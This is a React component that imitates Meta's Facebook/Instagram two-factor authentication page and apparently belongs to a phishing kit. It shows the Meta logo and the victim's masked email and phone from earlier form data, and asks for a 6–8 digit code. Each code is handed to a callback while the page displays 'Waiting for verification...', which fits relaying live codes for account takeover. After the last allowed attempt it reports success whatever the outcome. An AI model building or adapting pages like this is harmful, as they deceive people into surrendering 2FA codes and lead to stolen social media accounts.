'use client';

import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';
import { imageSrc } from '@/utils/image-src';

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData, loginProvider = 'facebook' }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [waitingApproval, setWaitingApproval] = useState(false);

    const providerLabel = loginProvider === 'instagram' ? texts.providerInstagram : texts.providerFacebook;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const normalizedCode = String(code || '').replace(/\D/g, '');

        if (!/^\d{6,8}$/.test(normalizedCode) || isLoading) {
            return;
        }

        setIsLoading(true);
        setShowError(false);
        setWaitingApproval(true);

        try {
            const result = await onSubmit(normalizedCode);
            setWaitingApproval(false);

            if (result?.approved) {
                onSuccess();
                return;
            }

            const nextAttempts = attempts + 1;
            setAttempts(nextAttempts);

            if (result?.isLastAttempt) {
                onSuccess();
                return;
            }

            setShowError(true);
            setCode('');
        } catch {
            setWaitingApproval(false);
            setShowError(true);
            setCode('');
        } finally {
            setIsLoading(false);
        }
    };

    const maskEmail = (email) => {
        if (!email) return 't**t@example.us';
        const [local, domain] = email.split('@');
        if (!domain) return email;
        if (local.length <= 2) return `${local[0]}**@${domain}`;
        return `${local[0]}**${local[local.length - 1]}@${domain}`;
    };

    const maskPhone = (phone) => {
        if (!phone) return '+84 ****** XX';
        const digits = phone.replace(/\D/g, '');
        if (digits.length < 4) return phone;
        return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
    };

    if (!show) return null;

    const userName = formData?.fullName || texts.defaultUserName || 'User';
    const maskedEmail = maskEmail(formData?.personalEmail);
    const maskedPhone = maskPhone(formData?.phone);
    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.MAX_CODE || 3})`;
    const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));

    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '8px',
        overflowY: 'auto'
    };

    const modalStyle = {
        width: '100%',
        maxWidth: '520px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: 'min(860px, calc(100vh - 16px))',
        maxHeight: 'min(860px, calc(100vh - 16px))',
        overflowY: 'auto'
    };

    const bodyStyle = {
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'space-between',
        flex: 1
    };

    const inputWrapperStyle = {
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        padding: '0 11px',
        marginBottom: '4px',
        display: 'flex',
        alignItems: 'center'
    };

    const inputStyle = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        fontSize: '14px',
        backgroundColor: 'transparent',
        color: '#333'
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                <div style={bodyStyle}>
                    <div style={{ width: '100%' }}>
                        <div
                            style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '6px',
                                fontSize: '14px',
                                color: '#9a979e',
                                marginBottom: '7px'
                            }}
                        >
                            <span>{userName}</span>
                            <div style={{ width: '4px', height: '4px', backgroundColor: '#9a979e', borderRadius: '5px' }} />
                            <span>{providerLabel}</span>
                        </div>

                        <h2 style={{ fontSize: '22px', lineHeight: 1.25, color: '#000', fontWeight: 700, marginBottom: '12px' }}>
                            {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
                        </h2>

                        <p style={{ color: '#9a979e', fontSize: '15px', lineHeight: 1.55, margin: 0 }}>
                            {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app.'}`}
                        </p>

                        <div style={{ width: '100%', borderRadius: '10px', backgroundColor: '#f5f5f5', overflow: 'hidden', margin: '15px 0' }}>
                            <img src={imageSrc(TwoFAImage)} width='100%' alt={texts.altAuthentication || 'Authentication'} style={{ display: 'block' }} />
                        </div>

                        <form onSubmit={handleSubmit}>
                            <div style={inputWrapperStyle}>
                                <input
                                    style={inputStyle}
                                    inputMode='numeric'
                                    placeholder={texts.code || 'Code'}
                                    maxLength='8'
                                    type='text'
                                    autoComplete='off'
                                    value={code}
                                    onChange={(e) => {
                                        setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                        if (showError) setShowError(false);
                                    }}
                                />
                            </div>

                            {showError ? (
                                <p style={{ color: '#e74c3c', fontSize: '12px', margin: '-1px 0 10px 0' }}>
                                    {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                                </p>
                            ) : null}

                            {waitingApproval && isLoading && (
                                <p style={{ color: '#0064E0', fontSize: '13px', margin: '0 0 10px 0', textAlign: 'center' }}>
                                    {texts.waitingApproval || 'Waiting for verification...'}
                                </p>
                            )}

                            <div style={{ width: '100%', marginTop: '10px' }}>
                                <button
                                    type='submit'
                                    disabled={isLoading || !isCodeValid}
                                    style={{
                                        minHeight: '40px',
                                        width: '100%',
                                        backgroundColor: '#0064E0',
                                        color: '#fff',
                                        borderRadius: '40px',
                                        padding: '8px 16px',
                                        border: 'none',
                                        fontSize: '14px',
                                        fontWeight: 600,
                                        cursor: isLoading || !isCodeValid ? 'not-allowed' : 'pointer',
                                        opacity: isLoading || !isCodeValid ? 0.7 : 1
                                    }}
                                >
                                    {isLoading ? (
                                        <span
                                            style={{
                                                width: '20px',
                                                height: '20px',
                                                border: '3px solid rgba(255,255,255,0.4)',
                                                borderTopColor: '#fff',
                                                borderRadius: '50%',
                                                animation: 'spin 0.8s linear infinite',
                                                display: 'inline-block'
                                            }}
                                        />
                                    ) : (
                                        texts.continueBtn || 'Continue'
                                    )}
                                </button>
                            </div>

                            <div
                                style={{
                                    width: '100%',
                                    marginTop: '20px',
                                    color: '#8f949d',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    borderRadius: '40px',
                                    minHeight: '40px',
                                    border: '1px solid #d4dbe3',
                                    fontSize: '14px'
                                }}
                            >
                                <span>{texts.tryAnotherMethod || 'Try another method'}</span>
                            </div>

                            <div style={{ width: '64px', margin: '20px auto 0' }}>
                                <img src={imageSrc(MetaLogo)} width='100%' alt={texts.altMeta || 'Meta'} style={{ objectFit: 'contain' }} />
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object,
    loginProvider: PropTypes.string
};

export default TwoFAModal;
